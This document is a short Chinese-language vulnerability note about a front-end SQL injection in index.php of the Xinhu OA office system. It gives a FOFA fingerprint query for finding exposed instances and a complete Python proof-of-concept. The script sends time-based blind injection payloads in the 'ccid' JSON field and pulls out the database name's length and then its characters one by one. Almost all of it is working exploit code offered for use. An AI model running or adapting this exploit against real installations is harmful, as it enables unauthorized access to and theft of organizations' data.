# 信呼OA办公系统前台index.php存在SQL注入漏洞



## fofa

```java
icon_hash="1652488516"
```

## poc

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2025/3/31 16:29
# @Author  : dreamlane
# @File    : 信呼OA前台注入.py
# @Software: PyCharm

import requests

url = 'http://localhost/index.php?&a=api&d=task&m=openkqj|openapi&sn=a&c=/post'

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080",
}


def GetLenDatebaseNameLength():
    for i in range(1, 15):
        data = [{
            "data": "fingerprint",
            "ccid": f"1'and if(length(database())={i},sleep(3),1)#",
            "fingerprint": "123"
        }]
        # 使用 json 参数传递数据
        test = requests.post(url=url, json=data, proxies=proxies)
        if (test.elapsed.total_seconds() > 2):
            print(f"数据库的长度为{i}")
            GetLenDatebaseName(i)


"""查库名称"""


def GetLenDatebaseName(Len):
    a = ''
    for i in range(Len):
        for j in range(32, 126):  # ASCII可打印字符范围
            data = [{
                "data": "fingerprint",
                "ccid": f"1' and if(ascii(substr(database(),{i},1))={j},SLEEP(3),1)#",
                "fingerprint": "123"
            }]
            test = requests.post(url=url, json=data, proxies=proxies)
            if test.elapsed.total_seconds() > 2:
                a = a + chr(j)
                print(a)




if __name__ == '__main__':
    GetLenDatebaseNameLength()
```
